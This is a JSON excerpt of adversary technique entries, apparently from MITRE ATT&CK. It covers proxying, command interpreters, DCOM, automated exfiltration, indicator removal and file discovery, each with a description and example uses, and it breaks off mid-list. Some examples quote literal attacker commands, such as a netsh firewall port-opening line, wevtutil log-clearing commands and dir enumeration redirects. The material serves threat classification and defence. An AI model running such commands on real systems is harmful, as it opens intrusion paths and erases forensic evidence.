  "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea": {
    "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
    "example_uses": [
      "An  downloader establishes SOCKS5 connections for its initial C2.",
      "functions as a proxy server between the victim and C2 server.",
      "can start SOCKS proxy threads.",
      "can function as a proxy to create a serve that relays communication between the client and C&C server.",
      "can communicate over a reverse proxy using SOCKS5.",
      "uses the command cmd.exe /c netsh firewall add portopening TCP 443 \"adp\" and makes the victim machine function as a proxy server.",
      "A  variant can force the compromised system to function as a proxy server.",
      "has connected to C2 servers through proxies.",
      "is capable of tunneling though a proxy.",
      "uses multiple proxies to obfuscate network traffic from victims.",
      "is a simple proxy that creates an outbound RDP connection.",
      "identifies a proxy server if it exists and uses it to make HTTP requests.",
      "used a proxy server between victims and the C2 server.",
      "The \"ZJ\" variant of  allows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server.",
      "has used a global service provider's IP as a proxy for C2 traffic from a victim.",
      "can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.",
      "can be used to set up a proxy tunnel to allow remote host access to an infected host.",
      "is used for proxying connections to obfuscate command and control infrastructure.",
      "leveraged several compromised universities as proxies to obscure its origin.",
      "relays traffic between a C2 server and a victim.",
      "can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.",
      "supports peer connections.",
      "has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.",
      "used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.  has also used a machine to relay and obscure communications between  and their server.",
      "can implement use of proxies to pivot traffic.",
      "can create a proxy server on compromised hosts.",
      "has deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet.",
      "has used compromised devices and customized versions of open source tools such as Fast Reverse Proxy (FRP) Earthworm and  to proxy network traffic.",
      "has the ability to use port forwarding to establish a proxy between a target host and C2.",
      "has the ability to use an embedded SOCKS proxy in C2 communications.",
      "can proxy TCP socket connections to obfuscate command and control infrastructure.",
      "BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet but are interconnected locally.",
      "can utilize proxy for communications.",
      "can set up an HTTP or SOCKS proxy.",
      "RPC backdoors have included local UPnP RPC proxies.",
      "has multiple proxy options that mask traffic between the malware and the remote operators.",
      "has used the AirVPN service for operational activity.",
      "has the capability to act as a reverse proxy.",
      "can be used to proxy connections to machines located behind NAT or firewalls.",
      "has the ability to function as a SOCKS proxy.",
      "has leverage NordVPN for its egress points when targeting intended victims.",
      "has used frp ssf and Venom to establish SOCKS proxy connections.",
      "has used a customized version of the Iox port-forwarding and proxy tool.",
      "uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.",
      "can use SOCKS4 and SOCKS5 proxies to connect to actor-controlled C2 servers.  can also emulate a reverse proxy on a compromised machine to connect with actor-controlled C2 servers.",
      "has used a reverse proxy tool similar to the GitHub repository revsocks.",
      "has the ability to proxy network communications.",
      "contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers.",
      "uses the command cmd.exe /c netsh firewall add portopening TCP 443 adp and makes the victim machine function as a proxy server.",
      "can use a proxy during exfiltration if set in the configuration.",
      "has the ability to proxy communications with command and control (C2) servers.",
      "has delivered a generic Windows proxy Win32/Glubteta.M.  has also used multiple reverse proxy chains as part of their C2 infrastructure.",
      "contains modules that allow for use of proxies in command and control.",
      "During   used the Cloudflare CDN to proxy C2 traffic.",
      "can serve as a SOCKS proxy server.",
      "can use proxies for C2 traffic.",
      "can identify and use configured proxies in a compromised network for C2 communication.",
      "During  threat actors used a custom proxy tool called Agent which has support for multiple hops.",
      "can use proxy tools including boost_proxy_client for reverse proxy functionality.",
      "can act as a reverse proxy.",
      "has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.",
      "adopted Cloudflare as a proxy for compromised servers.",
      "has used Fast Reverse Proxy (FRP) for RDP traffic.",
      "has used a peer-to-peer (P2P) network for C2.",
      "has the ability to use a reverse SOCKS proxy module.",
      "has supported use of a proxy server.",
      "used a tool called CLASSFON to covertly proxy network communications.",
      "has the ability to proxy connections to specified remote IPs and ports through a a proxy module.",
      "has used Cloudflare CDN associated infrastructure to redirect C2 communications to malicious domains.",
      "During   installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance.",
      "For  the threat actors used the ExpressVPN service to hide their location.",
      "has used compromised devices and customized versions of open source tools such as  (Fast Reverse Proxy) Earthworm and  to proxy network traffic.",
      "can proxy communications through a server in public IP space to local servers located behind a NAT or firewall.",
      "has used  ssf and Venom to establish SOCKS proxy connections.",
      "has the ability to use a HTTP proxy server for C&C communications.",
      "uses several proxy configuration settings to ensure connectivity.",
      "can use a proxy to connect to remote SFTP servers.",
      "proxied communication through the Cloudflare CDN service during .",
      "During  threat actors used the GO Simple Tunnel reverse proxy tool.",
      "has the ability to establish a SOCKS5 proxy on a compromised web server.",
      "implements SOCKS5 proxy functionality.",
      "can establish an HTTP or SOCKS proxy to tunnel data in and out of a network.",
      "can identify system proxy settings via `WinHttpGetIEProxyConfigForCurrentUser()` during initialization and utilize these settings for subsequent command and control operations."
    ],
    "id": "T1090",
    "name": "Proxy",
    "similar_words": [
      "Connection Proxy",
      "Proxy"
    ]
  },
  "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830": {
    "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
    "example_uses": [
      "uses cmd.exe to execute commands.",
      "executes commands remotely on the infected host.",
      "executes a binary on the system and logs the results into a temp file by using: cmd.exe /c \"<file_path> > %temp%\\PM* .tmp 2>&1\".",
      "uses the command prompt to execute commands on the victim's machine.",
      "Several commands are supported by the 's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint.",
      "can launch a remote shell to execute commands on the victim’s machine.",
      "has used cmd.exe to execute commmands.",
      "can launch cmd.exe to execute commands on the system.",
      "opens a remote shell to execute commands on the infected system.",
      "used command line for execution.",
      "malware can use cmd.exe to download and execute payloads and to execute commands on the system.",
      "is capable of spawning a Windows command shell.",
      "launches a shell to execute commands on the victim’s machine.",
      "uses the command-line interface to execute arbitrary commands.",
      "uses cmd.exe and /bin/bash to execute commands on the victim’s machine.",
      "has the capability to execute commands using cmd.exe.",
      "can execute shell commands using cmd.exe.",
      "used cmd.exe to launch commands on the victim’s machine.",
      "creates a backdoor through which remote attackers can open a command-line interface.",
      "uses cmd.exe to execute commands on the victim’s machine.",
      "uses cmd.exe to execute commands on the victim’s machine.",
      "uses cmd.exe to execute commands for discovery.",
      "can open an interactive command-shell to perform command line functions on victim machines.",
      "can execute commands using a shell.",
      "uses cmd.exe to execute netshcommands.",
      "has a command to create a reverse shell.",
      "can launch a remote shell to execute commands.",
      "uses cmd.exe to execute commands on the victim’s machine.",
      "uses cmd.exe to execute scripts and commands on the victim’s machine.",
      "uses a command prompt to run a PowerShell script from Excel.",
      "uses cmd.exe to execute commands.",
      "executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.",
      "leverages cmd.exe to perform discovery techniques.",
      "executes commands remotely via cmd.exe.",
      "uses a command-line interface.",
      "can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.",
      "uses a backdoor known as BADFLICK that is is capable of generating a reverse shell.",
      "has used the command-line interface.",
      "can spawn remote shells.",
      "can use the command-line utility cacls.exe to change file permissions.",
      "creates a backdoor through which remote attackers can open a command line interface.",
      "provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet",
      "provides a reverse shell connection on 8338/TCP, encrypted via AES.",
      "creates a backdoor through which remote attackers can start a remote shell.",
      "can run a copy of cmd.exe.",
      "can execute shell commands.",
      "uses the command-line interface.",
      "is capable of creating a reverse shell.",
      "uses the command-line interface.",
      "uses a command-line interface to interact with systems.",
      "can execute commands from its C2 server.",
      "provides a reverse shell on the victim.",
      "has used the command-line interface.",
      "uses command line for execution.",
      "uses the command line.",
      "is capable of providing Meterpreter shell access.",
      "can execute commands on victims.",
      "can execute shell commands.",
      "can execute commands on the victim's machine.",
      "has used the command-line interface for execution.",
      "has used command line during its intrusions.",
      "can provide a remote shell.",
      "has used command-line interfaces for execution.",
      "can execute commands on the victim.",
      "is capable of executing commands and spawning a reverse shell.",
      "can receive and execute commands with cmd.exe. It can also provide a reverse shell.",
      "can create a remote shell and run a given command.",
      "is capable of performing remote command execution.",
      "Adversaries can direct  to execute from the command-line on infected hosts, or have  create a reverse shell.",
      "has the capability to create a remote shell.",
      "is capable of creating a remote Bash shell and executing commands.",
      "is capable of executing commands via cmd.exe.",
      "allows adversaries to execute shell commands on the infected host.",
      "has the capability to create a reverse shell on victims.",
      "is capable of executing commands.",
      "has the ability to create a reverse shell.",
      "executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.",
      "A module in  allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe.",
      "is capable of creating a reverse shell.",
      "has the capability to create a reverse shell.",
      "can execute commands using cmd.exe.",
      "has the capability to create a remote shell and execute specified commands.",
      "uses cmd.exe to run commands for enumerating the host.",
      "provides command-line access to the compromised system.",
      "is capable of opening a command terminal.",
      "is capable of creating reverse shell.",
      "uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.",
      "is capable of providing shell functionality to the attacker to execute commands.",
      "kills and disables services by using cmd.exe.",
      "can execute commands via an interactive command shell.",
      "calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.  also has the capability to invoke a reverse shell.",
      "has the ability to execute shell commands.",
      "executes cmd.exe to provide a reverse shell to adversaries.",
      "runs cmd.exe /c and sends the output to its C2.",
      "is capable of spawning a reverse shell on a victim.",
      "opens cmd.exe on the victim.",
      "has the capability to open a remote shell and run basic commands.",
      "uses the command line and rundll32.exe to execute.",
      "is used to execute programs and other actions at the command-line interface.",
      "RAT is able to open a command shell.",
      "has the ability to remotely execute commands.",
      "supports execution from the command-line.",
      "has been used to execute remote commands.",
      "allows actors to spawn a reverse shell on a victim.",
      "Several tools used by  have been command-line driven.",
      "ran a reverse shell with Meterpreter.",
      "malware uses cmd.exe to execute commands on victims.",
      "actors spawned shells on remote systems on a victim network to execute commands.",
      "An  downloader uses the Windows command \"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers.",
      "Following exploitation with  malware,  actors created a file containing a list of commands to be executed on the compromised computer.",
      "has used the Windows command shell to execute commands.",
      "Malware used by  can run commands on the command-line interface.",
      "has used a Perl reverse shell to communicate with C2.",
      "malware uses WMI to script data collection and command execution on the victim.",
      "used SQL scripts to help perform tasks on the victim's machine.",
      "can execute various types of scripts on the victims machine.",
      "has used scripting to iterate through a list of compromised PoS systems copy data to a log file and remove the original data files.",
      "For  the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.",
      "can generate shellcode outputs that execute via Ruby.",
      "can receive a command line argument to limit file encryption to specified directories.",
      "scans processes on all victim systems in the environment and uses automated scripts to pull back the results.",
      "has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.",
      "can create a reverse shell between the infected host and a specified system.",
      "During  threat actors used Perl scripts to enable the deployment of the THINSPOOL shell script dropper and for enumerating host data.",
      "downloaded and launched code within a SCT file.",
      "is able to open a remote shell to execute commands.",
      "has used COM scriptlets to download Cobalt Strike beacons.",
      "has used the command line for execution.",
      "has the ability to create reverse shells with Perl scripts.",
      "contains functionality to execute arbitrary commands passed to it.",
      "can support commands to execute Java-based payloads.",
      "has used a simple remote shell tool that will call back to the C2 server and wait for commands.",
      "can launch remote scripts on the victims machine.",
      "uses Perl scripts.",
      "has utilized custom scripts to perform internal reconnaissance.",
      "has used Ruby scripts to execute payloads.",
      "has used a Perl script for information gathering.",
      "has the ability to run executables with command-line arguments.",
      "has executed a Lua script through a Lua interpreter for Windows.",
      "has used various types of scripting for execution.",
      "can create bind and reverse shells on the infected system.",
      "used XLM 4.0 macros for initial code execution for malicious document files.",
      "can receive command line arguments from an operator to corrupt the file system using the  driver.",
      "has used the Windows Script Host (wscript) to execute intermediate files written to victim machines.",
      "was delivered as a Java Archive (JAR) that runs by attaching itself to the Apache Tomcat Java servlet and web server.",
      "variants can be delivered via highly obfuscated Windows Script Files (WSF) for initial execution.",
      "has executed PHP and Shell scripts to identify and infect subsequent routers for the ORB network.",
      "has provided an arbitrary command execution interface.",
      "included the adversary executing command line interface (CLI) commands."
    ],
    "id": "T1059",
    "name": "Command and Scripting Interpreter",
    "similar_words": [
      "Command-Line Interface",
      "Command and Scripting Interpreter"
    ]
  },
  "attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7": {
    "description": "Windows Distributed Component Object Model (DCOM) is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology. COM is a component of the Windows application programming interface (API) that enables interaction between software objects. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL) (Citation: Microsoft Process Wide Com Keys) (Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods. (Citation: Enigma MMC20 COM Jan 2017) (Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.\n\nDCOM may also expose functionalities that can be leveraged during other areas of the adversary chain of activity such as Privilege Escalation and Persistence. (Citation: ProjectZero File Write EoP Apr 2018)",
    "example_uses": [
      "can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.",
      "can deliver \"beacon\" payloads for lateral movement by leveraging remote COM execution."
    ],
    "id": "T1175",
    "name": "Distributed Component Object Model",
    "similar_words": [
      "Distributed Component Object Model"
    ]
  },
  "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9": {
    "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
    "example_uses": [
      "performs data exfiltration is accomplished through the following command-line command: from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt.",
      "exfiltrates collected files automatically over FTP to remote servers.",
      "automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.",
      "automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes.  also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.",
      "When a document is found matching one of the extensions in the configuration,  uploads it to the C2 server.",
      "can automatically exfiltrate collected documents to the C2 server.",
      "can be configured to automatically exfiltrate files under a specified directory.",
      "During  the threat actors collected information via  which was automatically sent back to the adversary's C2.",
      "has configured tools to automatically send collected files to attacker controlled servers.",
      "has the ability to automatically send collected data back to the threat actors' C2.",
      "has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.",
      "can automatically upload collected files to its C2 server.",
      "has the ability to automatically exfiltrate files and keylogs.",
      "s collected files are exfiltrated automatically to remote servers.",
      "can automatically exfiltrate gathered SSH credentials.",
      "has performed frequent and scheduled data exfiltration from compromised networks.",
      "has the ability to manage an automated queue of egress files and commands sent to its C2.",
      "automatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine.",
      "has automatically exfiltrated stolen files to Dropbox.",
      "has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.",
      "has used modules that automatically upload gathered documents to the C2 server.",
      "sent collected system and network information compiled into a report to an adversary-controlled C2.",
      "has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.",
      "When a document is found matching one of the extensions in the configuration  uploads it to the C2 server.",
      "If credentials are not collected for two weeks  encrypts the credentials using a public key and sends them via UDP to an IP address located in the DNS TXT record.",
      "will automatically collect and exfiltrate data identified in received configuration files from command and control nodes.",
      "has used batch scripts to exfiltrate data.",
      "delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.",
      "included scripted exfiltration of collected data.",
      "can automatically exfitrate files from compromised systems.",
      "can upload encyrpted data for exfiltration.",
      "automatically sends gathered email credentials following collection to command and control servers via HTTP POST."
    ],
    "id": "T1020",
    "name": "Automated Exfiltration",
    "similar_words": [
      "Automated Exfiltration"
    ]
  },
  "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69": {
    "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversarys actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
    "example_uses": [
      "delets all artifacts associated with the malware from the infected machine.",
      "has cleared select event log entries.",
      "cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.",
      "clears the system event logs.",
      "removes logs from /var/logs and /Library/logs.",
      "contains code to clear event logs.",
      "clears event logs.",
      "has cleared logs during post compromise cleanup activities.",
      "creates a backdoor through which remote attackers can clear all system event logs.",
      "can overwrite Registry settings to reduce its visibility on the victim.",
      "has a module to clear event logs with PowerShell.",
      "has cleared event logs from victims.",
      "is capable of deleting Registry keys used for persistence.",
      "After encrypting log files, the log encryption module in  deletes the original, unencrypted files from the host.",
      "The  component KillDisk is capable of deleting Windows Event Logs.",
      "RAT is able to wipe event logs.",
      "has the ability to remove Registry entries that it created during execution.",
      "used  to remove artifacts from victims.",
      "has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security.",
      "can erase file references to payloads in-memory after being reflectively loaded and executed.",
      "has the ability to clean up and remove data structures from a compromised host.",
      "has deleted arbitrary Registry values.",
      "has removed the watermark associated with enabling the TESTSIGNING boot configuration option by removing the relevant strings in the user32.dll.mui of the system.",
      "has a function called DeleteLeftovers to remove certain artifacts of the attack.",
      "can remove artifacts from the compromised host including created Registry keys.",
      "During  threat actors cleared logs to remove traces of their activity and restored compromised systems to a clean state to bypass manufacturer mitigations for CVE-2023-46805 and CVE-2024-21887.",
      "can disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services.",
      "has a command to delete a Registry key it uses \\Software\\Microsoft\\Internet Explorer\\notes.",
      "can delete OLE Automation and SQL stored procedures used to store malicious payloads.",
      "can clear a memory blog in the process by overwriting it with junk bytes.",
      "has used the THINBLOOD utility to clear SSL VPN log files located at `/home/runtime/logs`.",
      "has the ability to clean traces of malware deployment.",
      "has the ability to delete created WMI objects to evade detections.",
      "During the   temporarily replaced legitimate utilities with their own executed their payload and then restored the original file.",
      "has restored malicious  code to its original state after the process execution flow has been hijacked.",
      "has used the Wow64RevertWow64FsRedirection function following attempts to delete the shadow volumes in order to leave the system in the same state as it was prior to redirection.",
      "will delete an associated registry key if a certain server response is received.",
      "has the ability to remove values it writes to the Registry.",
      "deletes all artifacts associated with the malware from the infected machine.",
      "can close specific Windows Security and Internet Explorer dialog boxes to mask external connections.",
      "can uninstall malicious components from the Registry stop processes and clear the browser history.",
      "removed HTTP proxy registry values to clean up traces of execution.",
      "can clear the browser history on a compromised host by changing the `ClearBrowsingHistoryOnExit` value to 1 in the `HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Privacy` Registry key.",
      "can delete various registry keys related to its execution and use.",
      "clears the file location `/proc/<PID>/environ` removing all environment variables for the process.",
      "uses a batch script to clear file system cache memory via the ProcessIdleTasks export in advapi32.dll as an anti-analysis and anti-forensics technique.",
      "restores the `.text` section of compromised DLLs after malicious code is loaded into memory and before the file is closed.",
      "has cleared Chrome browser history."
    ],
    "id": "T1070",
    "name": "Indicator Removal",
    "similar_words": [
      "Indicator Removal on Host",
      "Indicator Removal"
    ]
  },
  "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18": {
    "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).(Citation: US-CERT-TA18-106A)Some files and directories may require elevated or specific user permissions to access.",
    "example_uses": [
      "service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.",
      "identifies files with certain extensions from USB devices, then copies them to a predefined directory.",
      "lists the directories for Desktop, program files, and the user’s recently accessed files.",
      "can obtain a list of all files and directories as well as logical drives.",
      "used a batch script to gather folder and file names from victim hosts.",
      "searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip",
      "collected file listings of all default Windows directories.",
      "gathers file and directory information from the victim’s machine.",
      "used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.",
      "searches for files on the victim's machine.",
      "lists files on the victim’s machine.",
      "looks for specific files and file types.",
      "enumerates directories and obtains file attributes on a system.",
      "has a command to search for files on the victim’s machine.",
      "collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> \"C:\\windows\\TEMP\\[RANDOM].tmp\".",
      "can list all files on a system.",
      "finds a specified directory, lists the files and metadata about those files.",
      "can lists information about files in a directory.",
      "collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.",
      "enumerates directories and scans for certain files.",
      "checks its directory location in an attempt to avoid launching in a sandbox.",
      "can search directories for files on the victim’s machine.",
      "has the capability to gather the victim's current directory.",
      "lists files in directories.",
      "gathers information on victim’s drives and has a plugin for document listing.",
      "recursively searches through directories for files.",
      "creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.",
      "can conduct file browsing.",
      "can list directory contents.",
      "can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)",
      "creates a backdoor through which remote attackers can list contents of drives and search for files.",
      "can enumerate files and directories.",
      "can walk through directories and recursively search for strings in files.",
      "can gather victim drive information.",
      "creates a backdoor through which remote attackers can retrieve lists of files.",
      "searches for specified files.",
      "can enumerate drives and their types. It can also change file permissions using cacls.exe.",
      "identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.",
      "may enumerate user directories on a victim.",
      "has a tool that looks for files and directories on the local file system.",
      "has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.",
      "malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.",
      "can list directories on a victim.",
      "can search files on a victim.",
      "can list files and directories.",
      "collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.",
      "searches for files created within a certain timeframe and whose file extension matches a predefined list.",
      "has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.",
      "searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.",
      "attempts to access the ADMIN$, C$\\Windows, D$\\Windows, and E$\\Windows shares on the victim with its current privileges.",
      "has used  to locate PDF, Excel, and Word documents during. The group also searched a compromised DCCC computer for specific terms.",
      "can list file and directory information.",
      "is capable of performing directory listings.",
      "contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.",
      "searches attached and mounted drives for file extensions and keywords that match a predefined list.",
      "is capable of obtaining directory, file, and drive listings.",
      "is capable of listing files, folders, and drives on a victim.",
      "collects the victim's %TEMP% directory path and version of Internet Explorer.",
      "allows adversaries to search for files.",
      "has a command to list its directory and logical drives.",
      "has commands to enumerate all storage devices and to find all files that start with a particular string.",
      "is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.",
      "scans the victim for files that contain certain keywords from a list that is obtained from the C2 as a text file. It also collects information about installed software.",
      "has a command to retrieve metadata for files on disk as well as a command to list the current working directory.",
      "allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.",
      "searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.",
      "has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.",
      "has commands to list drives on the victim machine and to list file information for a given directory.",
      "obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.",
      "collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.",
      "identifies files matching certain file extension and copies them to subdirectories it created.",
      "has the ability to enumerate drive types.",
      "is capable of enumerating and manipulating files and directories.",
      "An older version of  has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.",
      "sets a WH_CBT Windows hook to search for and capture files on the victim.",
      "contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.",
      "is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.",
      "has the ability to enumerate files and drives.",
      "is capable of listing contents of folders on the victim.  also searches for custom network encryption software on victims.",
      "automatically searches for files on local drives based on a predefined list of file extensions.",
      "can enumerate and search for files and directories.",
      "gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry.  has searched for given file types.",
      "has the ability to search for a given filename on a victim.",
      "has a command to return a directory listing for a specified directory.",
      "A module in  collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.",
      "can be used to find files and directories with native functionality such as dir commands.",
      "identifies files and directories for collection by searching for specific file extensions or file modification time.",
      "has a command to obtain a directory listing.",
      "has the capability to obtain file and directory listings.",
      "has the capability to enumerate files.",
      "A variant of  executes dir C:\\progra~1 when initially run.",
      "searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.",
      "can scan victim drives to look for specific banking software on the machine to determine next actions. It also looks at browsing history and open tabs for specific strings.",
      "A  payload has searched all fixed drives on the victim for files matching a specified list of extensions.",
      "Several  malware samples use a common function to identify target files by their extension.  malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.",
      "has used Android backdoors capable of enumerating specific files on the infected devices.",
      "actors used the following commands after exploiting a machine with  malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download",
      "surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, and in the Program Files directory.",
      "uses command-line interaction to search files and directories.",
      "has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.",
